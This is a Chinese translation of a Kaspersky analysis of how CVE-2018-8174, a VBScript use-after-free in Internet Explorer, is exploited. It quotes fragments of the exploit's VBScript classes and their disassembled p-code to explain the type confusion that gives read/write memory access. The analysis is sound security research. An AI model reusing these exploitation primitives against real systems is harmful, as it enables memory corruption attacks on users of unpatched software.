> 原文链接: https://www.anquanke.com//post/id/150608 


# 深入研究VBScript


                                阅读量   
                                **106114**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：securelist.com
                                <br>原文地址：[https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/](https://securelist.com/delving-deep-into-vbscript-analysis-of-cve-2018-8174-exploitation/86333/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01cec27fcc617ffcd1.jpg)](https://p3.ssl.qhimg.com/t01cec27fcc617ffcd1.jpg)

4月下旬，我们发现了一个漏洞并对其发表了一篇报告[CVE-2018-8174](https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/)，这是我们的沙盒在Internet Explorer中发现的一个新0day漏洞，该漏洞使用了漏洞CVE-2014-6332的poc中一种常用的技术，实际上就是“破坏”了两个内存对象，并将一个对象的类型更改为Array（用于对地址空间的读/写访问），另一个对象类型更改为Integer，以获取任意对象的地址。

但是CVE-2014-6332的利用主要是针对写入任意内存位置的整数溢出，而我的兴趣点在于如何改编此技术以用于UAF漏洞。要回答这个问题，我们需要先考虑一下VBScript解释器的内部结构。



## 没有文档记载

调试一个VBScript可执行文件可是一项繁琐的工作，因为在执行之前它会先被编译成p代码（p-code），然后才由虚拟机解释。网上无法找到有关于此虚拟机的内部结构或者关于其指令的开源信息，不过花费了大量精力过后，我终于在几个网页中只找到了[1999年](https://groups.google.com/forum/#!topic/microsoft.public.inetserver.asp.general/xlCz5paTWxM)和[2004年](https://blogs.msdn.microsoft.com/ericlippert/2004/04/19/runtime-typing-in-vbscript/)的微软工程师报告，这些报告中揭示了一些关于p代码的信息，其中有足够的信息让我对所有的VM指令进行完全逆向，并编写一个反汇编程序。大家在我们的[Github存储库](https://github.com/KasperskyLab/VBscriptInternals)中可以找到用于在IDA Pro和WinDBG调试器的内存中反汇编VBScript p代码的最终脚本。

通过理解虚拟机解释代码，我们可以精确地监视脚本的执行情况：可以获得有关在任何指定时间点上代码被执行的位置的完整信息，并且可以观察脚本创建和引用的所有对象，所有的这些信息都可以对分析提供极大的帮助。

运行反汇编脚本的最佳位置是CScriptRuntime::RunNoEH函数，因为它可以直接解释p代码。[![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153028/180702-vbscript-1.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153028/180702-vbscript-1.png)

CScriptRuntime类中的重要字段

CScriptRuntime类包含了有关解释器状态的所有信息：局部变量、函数参数、指向堆栈顶部的指针和当前指令，以及被编译脚本的地址。

VBScript虚拟机是面向堆栈的，包含大约超过100条的指令。

所有变量（本地参数和堆栈上的变量）都表示为占用16个字节的[VARIANT](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221627(v=vs.85).aspx)结构，其中高位字表示数据类型，某些类型值在相关的[MSDN](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/3kfz157h(v=vs.84))页面上也可以找到。



## CVE-2018-8174利用

下面是’Class1’类的代码和反汇编后的p代码：

```
Class Class1
Dim mem
Function P
End Function
Function SetProp(Value)
    mem=Value
    SetProp=0
End Function
End Class
```

```
Function 34 (‘Class1’) [max stack = 1]:
        arg count = 0
        lcl count = 0
Pcode:
        0000    OP_CreateClass       
        0005    OP_FnBindEx      ‘p’ 35 FALSE
        000F    OP_FnBindEx      ‘SetProp’ 36 FALSE
        0019    OP_CreateVar     ‘mem’ FALSE
        001F    OP_LocalSet      0
        0022    OP_FnReturn     
Function 35 (‘p’) [max stack = 0]:
        arg count = 0
        lcl count = 0
Pcode:
        ***BOS(8252,8264)*** End Function *****
        0000    OP_Bos1          0
        0002    OP_FnReturn     
        0003    OP_Bos0         
        0004    OP_FuncEnd    
Function 36 (‘SetProp’) [max stack = 1]:
        arg count = 1
            arg  –1 = ref Variant    ‘value’
        lcl count = 0
Pcode:
        ***BOS(8292,8301)*** mem=Value *****
        0000    OP_Bos1          0
        0002    OP_LocalAdr      –1
        0005    OP_NamedSt       ‘mem’
        ***BOS(8304,8315)*** SetProp=(0) *****
        000A    OP_Bos1          1
        000C    OP_IntConst      0
        000E    OP_LocalSt       0
        ***BOS(8317,8329)*** End Function *****
        0011    OP_Bos1          2
        0013    OP_FnReturn     
        0014    OP_Bos0         
        0015    OP_FuncEnd
```

函数34是’Class1’类的构造函数。

OP_CreateClass指令调用VBScriptClass::Create函数来创建VBScriptClass对象。

OP_FnBindEx和OP_CreateVar指令尝试获取参数中传递的变量，由于它们尚不存在，因此它们由VBScriptClass::CreateVar函数创建。

下图显示了如何从VBScriptClass对象中获取变量，其中变量的值存储在VVAL结构中：[![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153031/180702-vbscript-2.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153031/180702-vbscript-2.png)

想要了解漏洞的利用方法，则需要先了解变量在VBScriptClass结构中的表示方式。

当在函数36(‘SetProp’)中执行OP_NamedSt ‘mem’指令时，它会调用先前堆叠的类的实例的默认属性Getter，然后将返回的值存储在变量’mem’中。

***BOS(8292,8301)*** mem=Value *****<br>
0000OP_Bos1 0<br>
0002OP_LocalAdr -1 &lt;————将参数置于堆栈<br>
0005OP_NamedSt’mem’&lt;———- – 如果它是具有默认属性Getter的类调度程序，则在**mem**中调用并存储返回的值

下面是在执行OP_NamedSt指令期间调用的30(p)函数的代码和反汇编的p代码：

```
Class lllIIl
Public Default Property Get P
Dim llII
P=CDbl(“174088534690791e-324”)
For IIIl=0 To 6
    IIIlI(IIIl)=0
Next
Set llII=New Class2
llII.mem=lIlIIl
For IIIl=0 To 6
    Set IIIlI(IIIl)=llII
Next
End Property
End Class
```

```
Function 30 (‘p’) [max stack = 3]:
        arg count = 0
        lcl count = 1
            lcl   1 =     Variant    ‘llII’
        tmp count = 4
Pcode:
        ***BOS(8626,8656)*** P=CDbl(“174088534690791e-324”) *****
        0000    OP_Bos1          0
        0002    OP_StrConst      ‘174088534690791e-324’
        0007    OP_CallNmdAdr    ‘CDbl’ 1
        000E    OP_LocalSt       0
        ***BOS(8763,8782)*** For IIIl=(0) To (6) *****
        0011    OP_Bos1          1
        0013    OP_IntConst      0
        0015    OP_IntConst      6
        0017    OP_IntConst      1
        0019    OP_ForInitNamed  ‘IIIl’ 5 4
        0022    OP_JccFalse      0047
        ***BOS(8809,8824)*** IIIlI(IIIl)=(0) *****
        0027    OP_Bos1          2
        0029    OP_IntConst      0
        002B    OP_NamedAdr      ‘IIIl’
        0030    OP_CallNmdSt     ‘IIIlI’ 1
        ***BOS(8826,8830)*** Next *****
        0037    OP_Bos1          3
        0039    OP_ForNextNamed  ‘IIIl’ 5 4
        0042    OP_JccTrue       0027
        ***BOS(8855,8874)*** Set llII=New Class2 *****
        0047    OP_Bos1          4
        0049    OP_InitClass     ‘Class2’
        004E    OP_LocalSet      1
        ***BOS(8876,8891)*** llII.mem=lIlIIl *****
        0051    OP_Bos1          5
        0053    OP_NamedAdr      ‘lIlIIl’
        0058    OP_LocalAdr      1
        005B    OP_MemSt         ‘mem’
        ….
```

该函数的第一个基本块是：

*** BOS（8626,8656）*** P = CDbl（“174088534690791e-324”）*****<br>
0000OP_Bos1 0<br>
0002OP_StrConst’174088534690791e-<br>
324’0007OP_CallNmdAdr’CDbl’1<br>
000EOP_LocalSt 0

该块将字符串’174088534690791e-324’转换为[VARIANT](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221627(v=vs.85).aspx)结构，并将其存储在本地变量0中，保留为函数的返回值。

[![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153036/180702-vbscript-3.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153036/180702-vbscript-3.png)

在将’174088534690791e-324’转换为双倍后得到VARIANT

设置后的返回值在被返回之前，执行以下函数：

For IIIl=0 To 6<br>
IIIlI(IIIl)=0<br>
Next

该函数会调用“Class1”实例的垃圾回收器，并由于我们之前提到的Class_Terminate()中存在的[use-after-free漏洞](https://securelist.com/root-cause-analysis-of-cve-2018-8174/85486/)而导致一个悬空指针引用。

In the line

***BOS(8855,8874)*** Set llII=New Class2 *****<br>
0047OP_Bos1 4<br>
0049OP_InitClass ‘Class2’<br>
004EOP_LocalSet 1

OP_InitClass ‘Class2’指令在先前释放的VBScriptClass 的**位置**创建’Class1’类的“evil twin”实例，该实例仍由函数36(‘SetProp’)中的OP_NamedSt ‘mem’指令引用。

“Class2”类是“Class1”类的“evil twin”：

```
Class Class2
Dim mem
Function P0123456789
    P0123456789=LenB(mem(IlII+(8)))
End Function
Function SPP
End Function
End Class
```

```
Function 31 (‘Class2’) [max stack = 1]:
        arg count = 0
        lcl count = 0
Pcode:
        0000    OP_CreateClass   ‘Class2’
        0005    OP_FnBindEx      ‘P0123456789’ 32 FALSE
        000F    OP_FnBindEx      ‘SPP’ 33 FALSE
        0019    OP_CreateVar     ‘mem’ FALSE
        001F    OP_LocalSet      0
        0022    OP_FnReturn     
Function 32 (‘P0123456789’) [max stack = 2]:
        arg count = 0
        lcl count = 0
Pcode:
        ***BOS(8390,8421)*** P0123456789=LenB(mem(IlII+(8))) *****
        0000    OP_Bos1          0
        0002    OP_NamedAdr      ‘IlII’
        0007    OP_IntConst      8
        0009    OP_Add          
        000A    OP_CallNmdAdr    ‘mem’ 1
        0011    OP_CallNmdAdr    ‘LenB’ 1
        0018    OP_LocalSt       0
        ***BOS(8423,8435)*** End Function *****
        001B    OP_Bos1          1
        001D    OP_FnReturn     
        001E    OP_Bos0         
        001F    OP_FuncEnd      
Function 33 (‘SPP’) [max stack = 0]:
        arg count = 0
        lcl count = 0
Pcode:
        ***BOS(8451,8463)*** End Function *****
        0000    OP_Bos1          0
        0002    OP_FnReturn     
        0003    OP_Bos0         
        0004    OP_FuncEnd
```

内存中变量的位置是可预测的。VVAL结构占用的数据量使用公式0x32 + UTF-16中变量名的长度计算。

下图显示了在分配’Class2’代替’Class1’时，’Class1’变量相对于’Class2’变量的位置。[![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153040/180702-vbscript-4.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153040/180702-vbscript-4.png)

当函数36(‘SetProp’)中的OP_NamedSt ‘mem’指令的完成执行后，函数30(‘p’)返回的值通过Class1中VVAL ‘mem’的悬空指针写入寄存器，并覆盖VARIANT Class2中的VVAL ‘mem’类型。

[![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153045/180702-vbscript-5.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/07/02153045/180702-vbscript-5.png)

Double类型的VARIANT将VARIANT类型从String重写为Array

因此，String类型的对象被转换为Array类型的对象，之前被认为是字符串的数据被视为Array控件结构，并被允许访问进程的整个地址空间。



## 结论

我们将用于反汇编VBScript的脚本编译成p代码，以便于以字节码级别启用VBScript调试，这样可以在分析漏洞的利用并了解VBScript的运行方式的时候提供有效的帮助，该脚本已存储在[我们的Github存储库](https://github.com/KasperskyLab/VBscriptInternals)中。

CVE-2018-8174的案例表明，当内存分配具有高度可预测性时，UAF漏洞会变得很容易被利用，在野外这种攻击常常被用来针对旧版Windows，尤其是在Windows 7和Windows 8.1中最有可能出现该攻击所需要的内存中对象的位置。

审核人：yiwang   编辑：边边
